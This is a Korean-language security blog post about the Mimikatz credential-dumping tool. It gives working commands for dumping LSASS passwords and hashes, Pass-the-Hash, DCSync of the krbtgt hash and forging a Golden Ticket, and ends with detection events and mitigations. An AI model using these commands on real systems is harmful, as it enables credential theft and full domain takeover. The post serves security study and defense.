---
layout: post
title: "Mimikatz (Credential Dumping)"
date: 2025-09-24 17:00:00 +0900
categories: [hacking-tools]
tags: [Mimikatz, Credential Dumping, LSASS, Windows, Hacking Tool]
description: "윈도우 시스템의 메모리에서 비밀번호와 해시를 추출하는 강력한 도구인 Mimikatz 분석"
---

## 1. 개요

**Mimikatz**는 윈도우 운영체제의 메모리(LSASS 프로세스)에서 평문 비밀번호, 해시(Hash), PIN 코드, 케르베로스 티켓 등을 추출하는 가장 강력한 자격 증명 탈취 도구이다.
초기 침투 후 내부망 이동(Lateral Movement)을 위해 관리자 계정 정보를 확보하는 단계에서 필수적으로 사용된다.
본 글에서는 Mimikatz의 원리를 이해하고, 실제 평문 비밀번호 추출부터 Pass-the-Hash 공격, 그리고 도메인 전체를 장악하는 Golden Ticket 생성까지 실습한다.

---

## 2. 주요 명령어

Mimikatz는 대화형 콘솔에서 명령어를 입력하는 방식으로 동작한다. 가장 먼저 디버그 권한을 획득해야 한다.

### 권한 상승
```cm
mimikatz # privilege::debug
Privilege '20' OK
```

### 1. 평문 비밀번호 및 해시 추출
현재 로그인된 사용자들의 인증 정보를 추출한다.
```cmd
mimikatz # sekurlsa::logonpasswords
```

### 2. Pass-the-Hash
비밀번호를 몰라도 NTLM 해시값만으로 인증을 우회하여 다른 시스템에 접근한다.
```cmd
mimikatz # sekurlsa::pth /user:Administrator /domain:target.local /ntlm:<NTLM_HASH>
```

### 3. DCSync (도메인 컨트롤러 복제)
도메인 관리자 권한이 있을 때, DC를 가장하여 모든 계정(krbtgt 포함)의 해시 정보를 동기화 요청으로 탈취한다.
```cmd
mimikatz # lsadump::dcsync /domain:target.local /user:krbtgt
```

---

## 3. 공격 실습: Golden Ticket

**Golden Ticket**은 도메인의 모든 서비스에 접근할 수 있는 만능 티켓(TGT)을 위조하는 공격이다. 이를 위해서는 `krbtgt` 계정의 해시가 필요하다.

### 티켓 생성
```cmd
mimikatz # kerberos::golden /user:fakeadmin /domain:target.local /sid:<Domain_SID> /krbtgt:<KRBTGT_HASH> /ptt
```

*   `/sid`: 도메인 SID
*   `/krbtgt`: DCSync 등으로 획득한 krbtgt 계정의 NTLM 해시
*   `/ptt`: 생성한 티켓을 현재 세션에 즉시 주입(Pass-the-Ticket)

### 트러블슈팅 및 확인
티켓 주입 후 `klist` 명령어로 티켓이 정상적으로 등록되었는지 확인하고, `dir \\DC\C$` 명령 등으로 도메인 컨트롤러 접근을 테스트한다.

---

## 4. 탐지 및 보안 대책

Mimikatz 공격은 시스템에 치명적이므로 다층적인 방어 전략이 필요하다.

### 탐지 방법
*   **LSASS 접근 탐지**: Sysmon Event ID 10 (ProcessAccess) 모니터링
*   **DCSync 탐지**: Event ID 4662 (디렉터리 서비스 개체 접근) 중 복제 관련 권한 요청 확인

### 보안 대책
1.  **Credential Guard 활성화**: 가상화 기반 보안(VBS)을 이용해 LSASS 프로세스를 격리한다.
2.  **LSA 보호 모드 (LSA Protection)**: 서명되지 않은 프로세스가 LSASS에 접근하지 못하도록 설정한다.
3.  **WDigest 비활성화**: 레지스트리 설정을 통해 비밀번호가 메모리에 평문으로 저장되지 않도록 한다.
4.  **Tiered Administration**: 도메인 관리자 계정은 일반 워크스테이션에 로그인하지 않도록 관리 계층을 분리한다.

<hr class="short-rule">
